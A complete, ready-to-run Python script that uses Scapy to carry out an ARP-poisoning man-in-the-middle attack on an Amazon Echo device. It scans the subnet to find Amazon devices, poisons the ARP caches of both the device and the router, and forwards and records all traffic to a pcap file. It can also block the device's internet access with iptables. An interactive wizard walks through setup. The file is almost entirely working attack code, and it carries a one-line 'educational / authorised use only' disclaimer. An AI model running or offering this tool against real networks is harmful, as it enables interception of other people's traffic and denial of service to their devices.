#!/usr/bin/env python3
"""
Alexa ARP MITM – educational ARP man-in-the-middle tool
========================================================
Performs a classic ARP-cache-poisoning (man-in-the-middle) attack between an
Amazon Echo (Alexa) device and its default gateway so that all traffic passes
through this host, where it can be inspected and optionally blocked.

If required values are not supplied on the command line the script will prompt
the user interactively, offering auto-detected suggestions where possible.

FOR EDUCATIONAL / AUTHORISED USE ONLY.  Only run this on networks and
equipment that you own or have explicit written permission to test.

Usage
-----
    # Fully interactive – the wizard asks for everything:
    sudo python3 Alexa_ARP_MITM.py

    # Partially supplied – wizard fills in the gaps:
    sudo python3 Alexa_ARP_MITM.py --alexa-ip 192.168.1.50

    # Fully non-interactive:
    sudo python3 Alexa_ARP_MITM.py \\
        --alexa-ip 192.168.1.50 \\
        --gateway-ip 192.168.1.1 \\
        --interface wlan0

Run ``python3 Alexa_ARP_MITM.py --help`` for the full option list.
"""
from __future__ import annotations

import argparse
import ipaddress
import logging
import os
import re
import signal
import subprocess
import sys
import threading
import time
import types

import scapy.all as scapy

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Amazon / Alexa OUI prefixes (first 3 octets, lower-case, colon-separated).
# Used by the network scanner to flag likely Alexa devices.
# ---------------------------------------------------------------------------
AMAZON_OUIS: set[str] = {
    "74:c2:46", "fc:a1:83", "44:65:0d", "f0:27:2d", "68:37:e9",
    "a0:02:dc", "34:d2:70", "ac:63:be", "18:74:2e", "4c:ef:c0",
    "b4:7c:59", "50:f5:da", "78:e1:03", "cc:9e:a2", "f8:04:2e",
    "84:d6:d0", "38:f7:3d", "08:05:81", "40:b4:cd", "3c:28:6d",
}

# ---------------------------------------------------------------------------
# Global stop event – set by the signal handler to let threads exit cleanly
# ---------------------------------------------------------------------------
_stop_event = threading.Event()

# Shared packet counter incremented by the capture callback
_packet_count = 0
_packet_lock  = threading.Lock()


# ---------------------------------------------------------------------------
# CLI argument parsing
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    """Parse and return command-line arguments.

    All key parameters default to ``None`` so the interactive wizard can
    detect which values still need to be filled in.
    """
    parser = argparse.ArgumentParser(
        description=(
            "ARP MITM tool for Alexa / Echo devices (educational use only).\n"
            "Omit any option to be prompted interactively."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--alexa-ip", default=None,
        metavar="IP",
        help="IP address of the target Alexa / Echo device.",
    )
    parser.add_argument(
        "--gateway-ip", default=None,
        metavar="IP",
        help="IP address of the default gateway (router). Auto-detected if omitted.",
    )
    parser.add_argument(
        "--interface", "-i", default=None,
        metavar="IFACE",
        help="Network interface to use for spoofing and sniffing.",
    )
    parser.add_argument(
        "--pcap", default=None,
        metavar="FILE",
        help="Output file for captured packets (default: alexa_mitm.pcap).",
    )
    parser.add_argument(
        "--filter", "-f", default=None,
        metavar="BPF",
        help=(
            "Berkeley Packet Filter expression applied to the sniffer "
            "(e.g. 'tcp port 443').  Captures all traffic when omitted."
        ),
    )
    parser.add_argument(
        "--no-drop", action="store_true", default=None,
        help="Skip the iptables rule that drops Alexa's Internet traffic.",
    )
    parser.add_argument(
        "--spoof-interval", type=float, default=None,
        metavar="SECONDS",
        help="Seconds between ARP spoof packets (default: 2.0).",
    )
    parser.add_argument(
        "--stats-interval", type=float, default=None,
        metavar="SECONDS",
        help="How often to print live packet-count statistics (default: 10.0). 0 disables.",
    )
    parser.add_argument(
        "--scan", action="store_true",
        help="Scan the local subnet for live hosts (and flag likely Alexa devices) before running.",
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true",
        help="Enable debug-level logging.",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Interactive wizard helpers
# ---------------------------------------------------------------------------

def _is_interactive() -> bool:
    """Return True when both stdin and stdout are connected to a real terminal."""
    return sys.stdin.isatty() and sys.stdout.isatty()


def _prompt(label: str, default: str, validator=None) -> str:
    """
    Print *label* and read a line from stdin.

    If the user presses Enter without typing anything *default* is used.
    If *validator* is provided it is called with the entered value; on
    failure the user is re-prompted until the input is accepted.
    """
    while True:
        try:
            raw = input(f"  {label} [{default}]: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)
        value = raw if raw else default
        if validator is None:
            return value
        try:
            validator(value)
            return value
        except ValueError as exc:
            print(f"    ✗  {exc}  – please try again.")


def _prompt_bool(label: str, default: bool) -> bool:
    """Prompt for a yes/no answer, returning a bool."""
    default_str = "y" if default else "n"
    while True:
        try:
            raw = input(f"  {label} [{'Y/n' if default else 'y/N'}]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)
        if not raw:
            return default
        if raw in ("y", "yes"):
            return True
        if raw in ("n", "no"):
            return False
        print("    ✗  Please enter y or n.")


def _validate_ip(value: str) -> None:
    """Raise ValueError if *value* is not a valid IPv4 address."""
    try:
        ipaddress.IPv4Address(value)
    except ipaddress.AddressValueError:
        raise ValueError(f"'{value}' is not a valid IPv4 address")


def _validate_positive_float(value: str) -> None:
    """Raise ValueError if *value* cannot be parsed as a positive float."""
    try:
        f = float(value)
    except ValueError:
        raise ValueError(f"'{value}' is not a number")
    if f <= 0:
        raise ValueError("Value must be greater than 0")


# ---------------------------------------------------------------------------
# Network / system helpers
# ---------------------------------------------------------------------------

def require_sudo() -> None:
    """Exit with an error message if the script is not running as root."""
    if os.geteuid() != 0:
        log.error("This script must be run with sudo / as root.")
        sys.exit(1)


def detect_gateway() -> str | None:
    """
    Return the default gateway IP by parsing ``ip route show default``.

    Returns ``None`` if the gateway cannot be determined.
    """
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, check=True,
        )
        m = re.search(r"default via (\S+)", result.stdout)
        if m:
            return m.group(1)
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    return None


def detect_default_interface() -> str | None:
    """
    Return the interface used by the default route (e.g. ``eth0``).

    Returns ``None`` if it cannot be determined.
    """
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, check=True,
        )
        m = re.search(r"dev (\S+)", result.stdout)
        if m:
            return m.group(1)
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    return None


def list_interfaces() -> list[str]:
    """Return a sorted list of non-loopback network interfaces."""
    try:
        ifaces = [i for i in scapy.get_if_list() if i != "lo"]
        return sorted(ifaces)
    except Exception:
        return []


def get_mac(ip: str) -> str | None:
    """
    Resolve the MAC address for *ip* via ARP.

    Returns the MAC string on success, or ``None`` if the host did not reply.
    """
    log.debug("ARP-resolving %s …", ip)
    ans, _ = scapy.arping(ip, timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv.hwsrc
    return None


# ---------------------------------------------------------------------------
# Network scanner
# ---------------------------------------------------------------------------

def scan_subnet(gateway_ip: str, interface: str) -> list[dict]:
    """
    ARP-scan the /24 subnet derived from *gateway_ip* and return a list of
    dicts with keys ``ip`` and ``mac``.  Amazon OUI matches are flagged with
    ``amazon=True``.
    """
    network = str(ipaddress.IPv4Network(gateway_ip + "/24", strict=False))
    log.info("Scanning %s on %s – this may take a few seconds…", network, interface)
    ans, _ = scapy.arping(network, iface=interface, timeout=3, verbose=0)
    hosts = []
    for _, rcv in ans:
        mac = rcv.hwsrc
        oui = ":".join(mac.lower().split(":")[:3])
        hosts.append({
            "ip":     rcv.psrc,
            "mac":    mac,
            "amazon": oui in AMAZON_OUIS,
        })
    hosts.sort(key=lambda h: ipaddress.IPv4Address(h["ip"]))
    return hosts


def print_scan_results(hosts: list[dict]) -> None:
    """Print a formatted table of *hosts* returned by :func:`scan_subnet`."""
    if not hosts:
        print("  (no hosts found)")
        return
    width_ip  = max(len(h["ip"])  for h in hosts)
    width_mac = max(len(h["mac"]) for h in hosts)
    header = f"  {'IP':<{width_ip}}   {'MAC':<{width_mac}}   Note"
    print(header)
    print("  " + "-" * (len(header) - 2))
    for h in hosts:
        note = "◀ likely Alexa / Amazon device" if h["amazon"] else ""
        print(f"  {h['ip']:<{width_ip}}   {h['mac']:<{width_mac}}   {note}")
    print()


# ---------------------------------------------------------------------------
# Interactive configuration wizard
# ---------------------------------------------------------------------------

def interactive_wizard(args: argparse.Namespace) -> argparse.Namespace:
    """
    Fill in any ``None`` (unspecified) fields in *args* by prompting the user.

    Auto-detected values are offered as defaults so the user can just press
    Enter to accept them.
    """
    print()
    print("=" * 60)
    print("  Alexa ARP MITM – interactive setup")
    print("  (press Enter to accept the value shown in [brackets])")
    print("=" * 60)
    print()

    # ── Interface ──────────────────────────────────────────────────
    ifaces           = list_interfaces()
    default_iface    = detect_default_interface() or (ifaces[0] if ifaces else "wlan0")
    if args.interface is None:
        if ifaces:
            print(f"  Available interfaces: {', '.join(ifaces)}")
        args.interface = _prompt("Network interface", default_iface)

    # ── Gateway IP ─────────────────────────────────────────────────
    default_gw = detect_gateway() or "192.168.1.1"
    if args.gateway_ip is None:
        args.gateway_ip = _prompt("Gateway IP", default_gw, _validate_ip)

    # ── Optional subnet scan ───────────────────────────────────────
    if args.scan or (args.alexa_ip is None and _prompt_bool(
        "Scan the subnet to help identify the Alexa device?", default=True
    )):
        hosts = scan_subnet(args.gateway_ip, args.interface)
        print_scan_results(hosts)

    # ── Alexa IP ───────────────────────────────────────────────────
    if args.alexa_ip is None:
        # Suggest the same /24 prefix as the gateway so the user only has
        # to type the last octet rather than a completely arbitrary default.
        try:
            gw_net   = ipaddress.IPv4Network(args.gateway_ip + "/24", strict=False)
            alexa_hint = str(next(
                h for h in gw_net.hosts() if str(h) != args.gateway_ip
            ))
        except Exception:
            alexa_hint = ""
        args.alexa_ip = _prompt("Alexa device IP", alexa_hint, _validate_ip)

    # ── PCAP output file ───────────────────────────────────────────
    if args.pcap is None:
        args.pcap = _prompt("Output PCAP file", "alexa_mitm.pcap")

    # ── BPF filter ─────────────────────────────────────────────────
    if args.filter is None:
        raw = _prompt("BPF capture filter (leave blank for all traffic)", "")
        args.filter = raw if raw else None

    # ── Block Internet? ────────────────────────────────────────────
    if args.no_drop is None:
        drop = _prompt_bool("Block Alexa's Internet traffic via iptables?", default=True)
        args.no_drop = not drop

    # ── Spoof interval ─────────────────────────────────────────────
    if args.spoof_interval is None:
        args.spoof_interval = float(
            _prompt("ARP spoof interval (seconds)", "2.0", _validate_positive_float)
        )

    # ── Stats interval ─────────────────────────────────────────────
    if args.stats_interval is None:
        args.stats_interval = float(
            _prompt("Live stats interval (seconds, 0 to disable)", "10.0")
        )

    print()
    return args


def apply_defaults(args: argparse.Namespace) -> argparse.Namespace:
    """Apply fallback values for any fields still ``None`` after CLI parsing."""
    if args.interface is None:
        args.interface = detect_default_interface() or "wlan0"

    if args.gateway_ip is None:
        gw = detect_gateway()
        if gw:
            args.gateway_ip = gw
        else:
            log.warning(
                "Could not auto-detect gateway; falling back to 172.20.10.1. "
                "Pass --gateway-ip to specify the correct value."
            )
            args.gateway_ip = "172.20.10.1"

    if args.alexa_ip is None:
        log.warning(
            "Alexa device IP not specified and cannot be auto-detected. "
            "Falling back to 172.20.10.14 – this is almost certainly wrong. "
            "Pass --alexa-ip or run interactively to be prompted."
        )
        args.alexa_ip = "172.20.10.14"

    if args.pcap          is None: args.pcap          = "alexa_mitm.pcap"
    if args.no_drop       is None: args.no_drop       = False
    if args.spoof_interval is None: args.spoof_interval = 2.0
    if args.stats_interval is None: args.stats_interval = 10.0
    return args


# ---------------------------------------------------------------------------
# IP forwarding
# ---------------------------------------------------------------------------

def enable_ip_forward() -> None:
    """Enable Linux kernel IP forwarding so intercepted packets are relayed."""
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            check=True, capture_output=True,
        )
        log.info("IP forwarding enabled.")
    except subprocess.CalledProcessError as exc:
        log.warning("Could not enable IP forwarding: %s", exc)


def disable_ip_forward() -> None:
    """Restore the kernel's IP forwarding to the off state."""
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            check=True, capture_output=True,
        )
        log.info("IP forwarding restored to disabled.")
    except subprocess.CalledProcessError as exc:
        log.warning("Could not disable IP forwarding: %s", exc)


# ---------------------------------------------------------------------------
# ARP spoofing
# ---------------------------------------------------------------------------

def arp_spoof(victim_ip: str, victim_mac: str, spoof_ip: str) -> None:
    """
    Send a single gratuitous ARP reply that poisons *victim_ip*'s cache.

    The packet tells *victim_ip* that *spoof_ip* is reachable via **our**
    MAC address, routing its traffic through this machine.
    """
    pkt = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)


def arp_restore(target_ip: str, target_mac: str, source_ip: str, source_mac: str) -> None:
    """
    Send corrective ARP replies to restore the true MAC→IP mapping.

    Call this during cleanup so the victim and gateway return to normal
    operation after the attack is stopped.
    """
    pkt = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(pkt, count=5, verbose=False)


def spoof_loop(
    alexa_ip: str,
    alexa_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    interval: float,
) -> None:
    """
    Continuously send ARP spoof packets until *_stop_event* is set.

    Runs in a background daemon thread.  Poisons both the Alexa device
    (telling it this host is the gateway) and the gateway (telling it this
    host is the Alexa device).
    """
    log.debug("ARP spoof loop started (interval=%.1fs).", interval)
    while not _stop_event.is_set():
        arp_spoof(alexa_ip,   alexa_mac,   gateway_ip)
        arp_spoof(gateway_ip, gateway_mac, alexa_ip)
        _stop_event.wait(timeout=interval)
    log.debug("ARP spoof loop exited.")


# ---------------------------------------------------------------------------
# iptables helpers
# ---------------------------------------------------------------------------

def iptables_block_internet(alexa_ip: str, gateway_ip: str) -> None:
    """
    Add an iptables FORWARD rule that drops Alexa traffic destined for the
    Internet (i.e. anything outside the local /24 subnet).
    """
    cmd = [
        "iptables", "-A", "FORWARD",
        "-s", alexa_ip,
        "!", "-d", gateway_ip + "/24",
        "-j", "DROP",
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        log.info("iptables rule installed: Alexa Internet traffic will be dropped.")
    except subprocess.CalledProcessError as exc:
        log.warning("Could not install iptables rule: %s", exc)


def iptables_unblock_internet(alexa_ip: str, gateway_ip: str) -> None:
    """Remove the FORWARD DROP rule added by :func:`iptables_block_internet`."""
    cmd = [
        "iptables", "-D", "FORWARD",
        "-s", alexa_ip,
        "!", "-d", gateway_ip + "/24",
        "-j", "DROP",
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        log.info("iptables rule removed.")
    except subprocess.CalledProcessError as exc:
        log.warning("Could not remove iptables rule: %s", exc)


# ---------------------------------------------------------------------------
# Packet capture & live statistics
# ---------------------------------------------------------------------------

def make_packet_handler(pcap_file: str):
    """
    Return a Scapy packet callback that appends each packet to *pcap_file*
    and increments the global packet counter.
    """
    global _packet_count

    def _handler(pkt) -> None:
        global _packet_count
        scapy.wrpcap(pcap_file, pkt, append=True)
        with _packet_lock:
            _packet_count += 1

    return _handler


def stats_loop(interval: float) -> None:
    """
    Print a live packet-count line every *interval* seconds until
    *_stop_event* is set.  Runs in a background daemon thread.
    """
    start = time.monotonic()
    while not _stop_event.is_set():
        _stop_event.wait(timeout=interval)
        if _stop_event.is_set():
            break
        with _packet_lock:
            count = _packet_count
        elapsed = time.monotonic() - start
        rate = count / elapsed if elapsed > 0 else 0.0
        log.info("Packets captured: %d  (%.1f pkt/s average)", count, rate)


def sniff_traffic(interface: str, pcap_file: str, bpf_filter: str | None) -> None:
    """
    Start Scapy's packet sniffer on *interface*.

    Captured packets are written to *pcap_file*.  An optional *bpf_filter*
    restricts which packets are captured.  The sniffer stops as soon as
    *_stop_event* is set.
    """
    filter_msg = f" (filter: '{bpf_filter}')" if bpf_filter else ""
    log.info("Sniffing on %s%s – packets saved to '%s'.", interface, filter_msg, pcap_file)
    log.info("Press Ctrl+C to stop.")
    kwargs: dict = dict(
        iface=interface,
        store=False,
        prn=make_packet_handler(pcap_file),
        stop_filter=lambda _pkt: _stop_event.is_set(),
    )
    if bpf_filter:
        kwargs["filter"] = bpf_filter
    scapy.sniff(**kwargs)


# ---------------------------------------------------------------------------
# Signal handling & cleanup
# ---------------------------------------------------------------------------

def _build_signal_handler(alexa_ip, alexa_mac, gateway_ip, gateway_mac, drop_internet):
    """Return a SIGINT/SIGTERM handler that performs graceful cleanup."""

    def _handler(signum: int, frame: types.FrameType | None) -> None:
        log.info("Caught signal %d – cleaning up…", signum)
        _stop_event.set()

        log.info("Restoring ARP caches…")
        arp_restore(alexa_ip,   alexa_mac,   gateway_ip, gateway_mac)
        arp_restore(gateway_ip, gateway_mac, alexa_ip,   alexa_mac)

        if drop_internet:
            iptables_unblock_internet(alexa_ip, gateway_ip)

        disable_ip_forward()

        with _packet_lock:
            count = _packet_count
        log.info("Total packets captured: %d", count)
        log.info("Done. Exiting.")
        sys.exit(0)

    return _handler


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    """Parse arguments, run the interactive wizard if needed, then start the attack."""
    args = parse_args()

    if args.verbose:
        log.setLevel(logging.DEBUG)

    # Fill in missing values interactively when running in a terminal,
    # or fall back to sensible defaults in non-interactive / pipe mode.
    missing = (
        args.alexa_ip is None
        or args.gateway_ip is None
        or args.interface is None
        or args.pcap is None
        or args.no_drop is None
        or args.spoof_interval is None
        or args.stats_interval is None
    )
    if missing and _is_interactive():
        args = interactive_wizard(args)
    else:
        args = apply_defaults(args)

    require_sudo()
    enable_ip_forward()

    # Optional subnet scan (non-interactive path: triggered by --scan flag)
    if args.scan and not _is_interactive():
        hosts = scan_subnet(args.gateway_ip, args.interface)
        print_scan_results(hosts)

    log.info("Resolving MAC addresses…")
    alexa_mac   = get_mac(args.alexa_ip)
    gateway_mac = get_mac(args.gateway_ip)

    if not alexa_mac:
        log.error(
            "Could not resolve MAC for Alexa (%s). Check the IP and connectivity.",
            args.alexa_ip,
        )
        sys.exit(1)
    if not gateway_mac:
        log.error(
            "Could not resolve MAC for gateway (%s). Check the IP and connectivity.",
            args.gateway_ip,
        )
        sys.exit(1)

    log.info("Alexa   %s  →  %s", args.alexa_ip,   alexa_mac)
    log.info("Gateway %s  →  %s", args.gateway_ip, gateway_mac)

    drop_internet = not args.no_drop
    if drop_internet:
        log.info("Installing iptables rule to block Alexa's Internet traffic…")
        iptables_block_internet(args.alexa_ip, args.gateway_ip)

    # Register cleanup handler for Ctrl-C / SIGTERM
    handler = _build_signal_handler(
        args.alexa_ip, alexa_mac,
        args.gateway_ip, gateway_mac,
        drop_internet,
    )
    signal.signal(signal.SIGINT,  handler)
    signal.signal(signal.SIGTERM, handler)

    log.info("Starting ARP spoofing thread (interval=%.1fs)…", args.spoof_interval)
    spoof_thread = threading.Thread(
        target=spoof_loop,
        args=(args.alexa_ip, alexa_mac, args.gateway_ip, gateway_mac, args.spoof_interval),
        daemon=True,
    )
    spoof_thread.start()

    # Optional live statistics thread
    if args.stats_interval and args.stats_interval > 0:
        stats_thread = threading.Thread(
            target=stats_loop, args=(args.stats_interval,), daemon=True,
        )
        stats_thread.start()

    sniff_traffic(args.interface, args.pcap, args.filter)


if __name__ == "__main__":
    main()
